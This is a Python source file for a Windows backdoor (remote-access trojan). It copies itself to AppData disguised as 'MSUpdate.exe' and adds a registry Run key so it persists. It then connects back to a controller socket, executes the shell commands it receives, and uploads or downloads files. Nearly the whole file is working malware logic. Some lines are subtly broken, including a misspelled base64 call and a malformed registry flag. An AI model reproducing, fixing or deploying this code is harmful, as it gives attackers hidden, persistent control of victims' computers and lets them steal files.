#!/usr/bin/env python

import socket, subprocess, json, os, base64, sys, shutil


class Backdoor:
    def __init__(self, ip, port):
        self.set_persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    # method to create Persistence by adding our program to the windows registry key [Run]
    def set_persistence(self):
        default_location = os.environ["appdata"] + "\\MSUpdate.exe"
        if not os.path.exists(default_location):
            shutil.copyfile(sys.executable, default_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /t "' + default_location + '"', shell=True)

    # Method to relaibly send data to server by converting the sent data to json format
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    # Method to relaibly receive data from the server sent in json format and converting it back to its initial state
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    # Method to execute system command on the target machine from the server
    def execute_sys_command(self, command):
        # Uncomment the following 2 lines if packaging using python 2
        # DEVNULL = open(os.devnull, 'wb')
        # return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

        # Python 3: execute the command and redirect standard error and input to DEVNULL to handle input and errors after packaging the script
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    # Method to change the working driectory on the target machine when called from the server
    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    # Method to read downloaded files from the target machine
    def read_files(self, path):
        with open(path, "rb") as file:
            return base64.b64b64encode(file.read())

    # Method to write uploaded files to the target machine
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful..."

    # Method to run the class methods and check for key commands to execute on target machine
    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":    # If exit command was sent from the server, end the connection
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:   # change directory if command cd is sent from the server
                    command_response = self.change_working_directory(command[1])
                elif command[0] == "download":  # read the file to download by calling the read_files method
                    command_response = self.read_files(command[1])
                elif command[0] == "upload":   # write the file to be uploaded to the file system
                    command_response = self.write_file(command[1], command[2])
                else:
                    command_response = self.execute_sys_command(command)    # Execute all other commands normally
            except Exception:
                command_response = "[-] Error during command execution..."

            self.reliable_send(command_response)
        self.connection.close()



# Create the object and set the parameters
try:
    my_backdoor = Backdoor("localhost", 8080)
    my_backdoor.run()
except Exception:
    sys.exit()
